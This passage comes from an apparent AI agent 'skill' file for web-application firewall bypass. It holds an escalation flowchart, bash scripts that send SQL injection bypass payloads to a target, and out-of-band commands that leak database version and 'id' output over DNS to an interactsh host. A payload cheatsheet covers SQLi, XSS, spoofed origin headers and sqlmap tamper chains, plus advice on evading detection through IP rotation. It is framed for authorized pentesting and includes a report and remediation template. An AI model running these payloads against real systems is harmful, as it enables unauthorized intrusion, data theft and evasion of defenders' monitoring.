│ 4c. Content-Type manipulation                       │
│ 4d. Chunked transfer encoding                       │
│ 4e. HTTP request smuggling (CL.TE)                  │
│ 4f. Parameter pollution (HPP)                       │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 5: Payload-Level Encoding Bypass               │
│ Per vuln class:                                     │
│                                                     │
│ SQLi:                                               │
│  5a. Comment variations: /**/, /*!50000...*/        │
│  5b. Whitespace: %09, %0a, %0d, %0b, %0c           │
│  5c. Case randomization                             │
│  5d. Version comments: /*!50000UNION*/              │
│  5e. URL double encoding: %2527 = %27 = '           │
│  5f. Scientific notation: 1E0                       │
│                                                     │
│ XSS:                                               │
│  5g. Tag mutation: <svg>, <details>, <input>        │
│  5h. Event handler variation                        │
│  5i. JS context: Function(), setTimeout()           │
│  5j. Encoding: &#x61;&#x6c;&#x65;&#x72;&#x74;      │
│  5k. AngularJS/template injection                   │
│                                                     │
│ CMDi:                                              │
│  5l. IFS substitution: ${IFS}                       │
│  5m. Brace expansion: {cat,/etc/passwd}             │
│  5n. Base64 encode: echo YmFz...|base64 -d|bash     │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 6: Tool-Assisted Bypass                        │
│ 6a. sqlmap with vendor-specific tamper chain        │
│ 6b. LLM-powered payload mutation                   │
│ 6c. Custom tamper script development                │
│ 6d. Fuzzing with ffuf + WAF bypass headers          │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 7: Protocol & Architecture Bypass              │
│ 7a. HTTP/3 QUIC (WAF may not inspect)               │
│ 7b. WebSocket upgrade                               │
│ 7c. gRPC protobuf                                   │
│ 7d. GraphQL endpoint                                │
│ 7e. JSON body vs form params                        │
│ 7f. Out-of-band (DNS exfil, Burp Collaborator)      │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 8: Rate Limiting + Timing Attacks              │
│ 8a. Slow down requests (--delay 5)                  │
│ 8b. IP rotation via proxy pool                      │
│ 8c. Distribute across multiple source IPs           │
│ 8d. Session rotation (new session per N requests)   │
│ 8e. Time-based blind (SLEEP, WAITFOR DELAY)         │
│     — bypasses block/monitor by avoiding detection  │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 9: Second-Order / Logic Bypasses               │
│ 9a. Store payload in benign field, trigger later    │
│ 9b. File upload → process later (SSTI, SSRF, XXE)  │
│ 9c. CSV/Excel injection via export feature          │
│ 9d. Log injection → log viewer XSS                  │
│ 9e. Email field injection → admin panel display     │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼ NO
┌─────────────────────────────────────────────────────┐
│ STEP 10: Cache Poisoning for WAF Bypass             │
│ 10a. Cache poisoning via unkeyed headers            │
│ 10b. Fat GET request (body not in cache key)        │
│ 10c. Parameter cloaking                             │
│ 10d. Web Cache Deception                            │
└─────────────────────────────────────────────────────┘
      │
      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ DOCUMENT as:                                        │
│ "WAF successfully blocks this attack vector"        │
│ → Move to next vuln class or attack surface         │
└─────────────────────────────────────────────────────┘

EXPLOIT PATH:
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ Confirm bypass is stable (5/5 requests bypass)      │
│ Verify actual vulnerability (not just bypass)       │
│ Document: payload + technique + evidence            │
│ → Proceed to exploitation per vuln class            │
└─────────────────────────────────────────────────────┘
```

---

## 16. BYPASS VERIFICATION AND REPORTING

### 16.1 Confirming WAF Bypass Without Triggering Alerts

```bash
# Step 1: Confirm the WAF blocks your baseline payload
BASE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
  "https://TARGET/?id=1'OR'1'='1")
[ "$BASE_CODE" = "403" ] && echo "Baseline: WAF is blocking (expected)"

# Step 2: Apply bypass technique
BYPASS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
  "https://TARGET/?id=1'/*!50000OR*//*!50000'1'*/='1")
echo "Bypass attempt: HTTP $BYPASS_CODE"

# Step 3: Confirm bypass is functional (not just evading — actually working)
# For SQLi: get DB response
RESPONSE=$(curl -sk "https://TARGET/?id=1'/*!50000UNION*//*!50000SELECT*/1,@@version,3--+-")
DB_VERSION=$(echo "$RESPONSE" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+-[A-Za-z]+')
if [ -n "$DB_VERSION" ]; then
  echo "[CONFIRMED] WAF bypass + SQLi working. DB: $DB_VERSION"
fi

# Step 4: Timing-based blind confirmation (less visible)
START=$(date +%s%N)
curl -sk "https://TARGET/?id=1'AND(SELECT(1)FROM(SELECT(SLEEP(3)))a)AND'1'='1" > /dev/null
END=$(date +%s%N)
ELAPSED=$(( (END - START) / 1000000 ))
[ "$ELAPSED" -gt 2900 ] && echo "[CONFIRMED] Time-based blind SQLi bypass confirmed (${ELAPSED}ms delay)"
```

### 16.2 Out-of-Band Bypass Confirmation

```bash
# Use Burp Collaborator or interactsh for zero-noise confirmation
# No reflected output needed — DNS interaction proves execution

# Start interactsh listener
interactsh-client &
COLLABORATOR_URL="xxxx.interact.sh"

# SQLi OOB confirmation via DNS
curl -sk "https://TARGET/?id=1'+AND+LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.',
'${COLLABORATOR_URL}','\\\\x'))--+"

# For MSSQL
curl -sk "https://TARGET/?id=1;EXEC+xp_dirtree+'\\\\${COLLABORATOR_URL}\\a'--"

# CMDi OOB
curl -sk "https://TARGET/?cmd=nslookup+\$(id).${COLLABORATOR_URL}"

# Wait for DNS interaction in interactsh output
# DNS record received = confirmed OOB execution
```

### 16.3 Evidence Collection Checklist

For each confirmed WAF bypass, collect:

```
1. BASELINE EVIDENCE
   □ Screenshot/capture of WAF blocking original payload
   □ HTTP request (raw) that was blocked
   □ HTTP response (raw) showing block page
   □ SHA256 of response body: sha256sum <<< "$BLOCKED_BODY"

2. BYPASS EVIDENCE  
   □ Exact HTTP request that bypassed WAF (curl command + raw request)
   □ HTTP response showing bypass succeeded (200   □ Timestamp of bypass (for correlation with WAF logs)
   □ 5x repeated successful bypass requests (confirms stability)
   □ Actual vulnerability output (DB version, /etc/passwd line, RCE output)

3. CHAIN EVIDENCE (if bypass + vuln chained)
   □ Each step documented separately
   □ Intermediate output captured at each link
   □ Final impact demonstrated with distinct independent command

4. FILE ARTIFACTS
   □ All raw HTTP traffic saved: workspace/vulns/confirmed/FINDING_NAME/
   □ Payload file: payload.txt
   □ Request file: request.http
   □ Response file: response.html
   □ Evidence hash: sha256sum * > hashes.txt
```

### 16.4 WAF Bypass Finding Report Template

```markdown
## Finding: WAF Bypass via [TECHNIQUE] → [VULNERABILITY CLASS]

**Severity:** Critical / High / Medium  
**Status:** Confirmed  
**CVSS:** (calculate based on impact)

### Summary
The [VENDOR] WAF protecting [TARGET] was bypassed using [TECHNIQUE], allowing
exploitation of [VULNERABILITY] in parameter [PARAM] of endpoint [ENDPOINT].

### Affected Component
- URL: https://TARGET/path/to/endpoint
- Parameter: id / q / search / etc.
- WAF Vendor: Cloudflare / AWS WAF / ModSecurity / etc.
- Backend DB / Tech: MySQL 8.0.x / Apache 2.4.x / etc.

### Reproduction Steps

1. Confirm WAF blocks baseline payload:
   ```
   GET /endpoint?param=BASELINE_PAYLOAD HTTP/1.1
   Host: TARGET.COM
   
   Response: HTTP/1.1 403 Forbidden
   ```

2. Send bypass payload:
   ```
   GET /endpoint?param=BYPASS_PAYLOAD HTTP/1.1
   Host: TARGET.COM
   X-Forwarded-For: 127.0.0.1
   
   Response: HTTP/1.1 200 OK
   [DATABASE VERSION / COMMAND OUTPUT / SENSITIVE DATA]
   ```

3. Confirm with independent observable:
   ```
   [TIMING / DNS INTERACTION / DB VERSION / FILE CONTENT]
   ```

### Technical Root Cause
The [VENDOR] WAF pattern match for [VULN CLASS] does not account for
[ENCODING / COMMENT STYLE / WHITESPACE VARIANT] used in the bypass payload.
The application backend normalizes the input before processing, resolving the
obfuscation after the WAF has already approved the request.

### Evidence Files
- `request_blocked.http` — SHA256: [HASH]
- `request_bypass.http` — SHA256: [HASH]  
- `response_bypass.html` — SHA256: [HASH]
- `bypass_confirmed_5x.txt` — 5 successful repetitions

### Business Impact
[Describe what an attacker can do with this bypass: data exfiltration, RCE, etc.]

### Remediation
1. **Immediate:** [Temporary mitigation — IP block, rate limit, disable feature]
2. **Short-term:** Update WAF ruleset to cover [ENCODING VARIANT]
3. **Long-term:** [Parameterized queries / output encoding / input validation at application layer]
4. **Verify fix:** Retest with payload variants from this report — all should return 403.

### References
- WAF vendor advisory (if applicable)
- OWASP Testing Guide: [relevant section]
- CWE: [CWE-89 SQLi / CWE-79 XSS / etc.]
```

### 16.5 Bypass Stability Rating

Before reporting, rate bypass stability:

```
STABLE (5/5):   Same payload works 5 times in a row         → Report as confirmed
FLAKY (3/5):    Works ~60% — WAF may have randomized rules  → Note instability
INTERMITTENT:   Works 1-2/5 — anomaly scoring variation     → Document timing
RATE-LIMITED:   Works once, then blocked                    → Note rate limit bypass needed
```

```bash
# Stability test script
PAYLOAD="1'/*!50000UNION*//*!50000SELECT*/1,@@version,3--+-"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
SUCCESS=0

for i in $(seq 1 5); do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=$ENC")
  [ "$CODE" != "403" ] && SUCCESS=$((SUCCESS+1))
  echo "Attempt $i: HTTP $CODE"
  sleep 2
done

echo "Stability: $SUCCESS/5"
case $SUCCESS in
  5) echo "Rating: STABLE — safe to report as confirmed";;
  3|4) echo "Rating: FLAKY — note intermittency in report";;
  1|2) echo "Rating: INTERMITTENT — collect more evidence";;
  0) echo "Rating: BLOCKED — bypass failed";;
esac
```

---

## APPENDIX A: QUICK REFERENCE PAYLOAD CHEATSHEET

```
═══════════════════════════════════════════════════════════════
WAF BYPASS QUICK REFERENCE — AUTHORIZED TESTING
═══════════════════════════════════════════════════════════════

SPACE BYPASS:
  /**/ %09 %0a %0d %0b %0c %a0 ()

QUOTE BYPASS (MySQL):
  0x27 /*!27*/ CHAR(39) %ef%bc%87

UNION BYPASS:
  /*!50000UNION*/ %23%0aUNION %0aUNION
  uNiOn UnIoN UNION%0d%0a

SELECT BYPASS:
  /*!50000SELECT*/ sElEcT %53ELECT S%65LECT

COMMENT BYPASS:
  -- --+ --+- --+%20 #%0a /*!...*/

XSS TAG BYPASS:
  <svg/onload=   <details/open/ontoggle=
  <input/autofocus/onfocus=   <img/src=x/onerror=

XSS EVENT BYPASS:
  onload= onerror= ontoggle= onfocus= onmouseover=
  onpointerover= onpointerenter= onpointerdown=

XSS FUNCTION BYPASS:
  alert` ` window[`alert`] (alert)(1)
  top[`al`+`ert`](1) [].constructor.constructor(`alert(1)`)()

ORIGIN IP:
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
  CF-Connecting-IP: 127.0.0.1

ENCODING CHAIN:
  '  →  %27  →  %2527  →  %252527
  <  →  %3C  →  %253C  →  &#60;  →  &#x3C;  →  \u003c
  /  →  %2F  →  %252F  →  %c0%af  →  %ef%bc%8f

TOP TAMPER COMBOS:
  Cloudflare:   space2comment,randomcase,charunicodeencode
  AWS WAF:      randomcase,space2mysqlblank,charencode
  ModSec CRS:   modsecurityversioned,space2comment,between
  Imperva:      securesphere,space2comment,charunicodeencode
  Akamai:       charunicodeencode,space2comment,randomcase
  F5:           versionedkeywords,space2comment,multiplespaces

PROTOCOL BYPASS ORDER:
  1. Direct origin IP
  2. HTTP/3 QUIC
  3. WebSocket upgrade
  4. GraphQL endpoint
  5. gRPC protobuf
  6. Chunked transfer
  7. HTTP smuggling
═══════════════════════════════════════════════════════════════
```

---

*Skill version: 2.0 — Updated 2024-2025*  
*For authorized penetration testing engagements only.*  
*Load this skill when: WAF is detected, payloads are being blocked, evasion is required.*
